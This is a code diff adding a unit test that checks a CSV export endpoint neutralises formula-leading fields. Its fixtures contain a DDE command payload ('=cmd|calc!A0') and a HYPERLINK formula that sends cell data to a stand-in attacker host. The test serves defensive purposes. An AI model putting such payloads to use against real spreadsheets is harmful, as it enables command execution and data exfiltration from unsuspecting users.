@@ -731,6 +731,21 @@ describe('Export Handler', () => {
       expect(dataLine).toContain('"He said ""hello"" to me"');
     });
 
+    it('should neutralise formula-leading sender name and content (CSV injection)', async () => {
+      mockQueryResults.messages = [createMockMessage({
+        senderName: '=cmd|calc!A0',
+        content: '=HYPERLINK("https://evil.example/?d="&A2,"Verify")'
+      })];
+
+      const res = await app.request('/api/messages/export?format=csv');
+      const text = await res.text();
+      const dataLine = text.split('\n')[1];
+
+      expect(dataLine).toContain("\"'=cmd|calc!A0\"");
+      expect(dataLine).toContain("\"'=HYPERLINK(\"\"https://evil.example/?d=\"\"&A2,\"\"Verify\"\")\"");
+      expect(dataLine).not.toContain(',"=');
+    });
+
     it('should handle null optional fields as empty strings', async () => {
       mockQueryResults.messages = [createMockMessage({
         sentAt: null,
